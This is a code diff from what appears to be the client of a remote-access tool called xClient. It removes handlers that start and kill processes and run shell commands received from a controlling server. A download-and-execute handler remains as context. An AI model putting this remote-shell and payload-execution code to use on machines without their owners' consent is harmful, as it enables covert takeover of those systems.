@@ -4,7 +4,6 @@ using System.IO;
 using System.Net;
 using System.Threading;
 using System.Windows.Forms;
-using xClient.Core.RemoteShell;
 using xClient.Core.Helper;
 
 namespace xClient.Core.Commands
@@ -12,67 +11,6 @@ namespace xClient.Core.Commands
     /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
     public static partial class CommandHandler
     {
-        public static void HandleStartProcess(Packets.ServerPackets.StartProcess command, Client client)
-        {
-            if (string.IsNullOrEmpty(command.Processname))
-            {
-                new Packets.ClientPackets.Status("Process could not be started!").Execute(client);
-                return;
-            }
-
-            try
-            {
-                ProcessStartInfo startInfo = new ProcessStartInfo
-                {
-                    UseShellExecute = true,
-                    FileName = command.Processname
-                };
-                Process.Start(startInfo);
-            }
-            catch
-            {
-                new Packets.ClientPackets.Status("Process could not be started!").Execute(client);
-            }
-            finally
-            {
-                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
-            }
-        }
-
-        public static void HandleKillProcess(Packets.ServerPackets.KillProcess command, Client client)
-        {
-            try
-            {
-                Process.GetProcessById(command.PID).Kill();
-            }
-            catch
-            {
-            }
-            finally
-            {
-                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
-            }
-        }
-
-        public static void HandleShellCommand(Packets.ServerPackets.ShellCommand command, Client client)
-        {
-            string input = command.Command;
-
-            if (_shell == null && input == "exit") return;
-            if (_shell == null) _shell = new Shell();
-
-            if (input == "exit")
-                CloseShell();
-            else
-                _shell.ExecuteCommand(input);
-        }
-
-        public static void CloseShell()
-        {
-            if (_shell != null)
-                _shell.Dispose();
-        }
-
         public static void HandleDownloadAndExecuteCommand(Packets.ServerPackets.DownloadAndExecute command,
             Client client)
         {
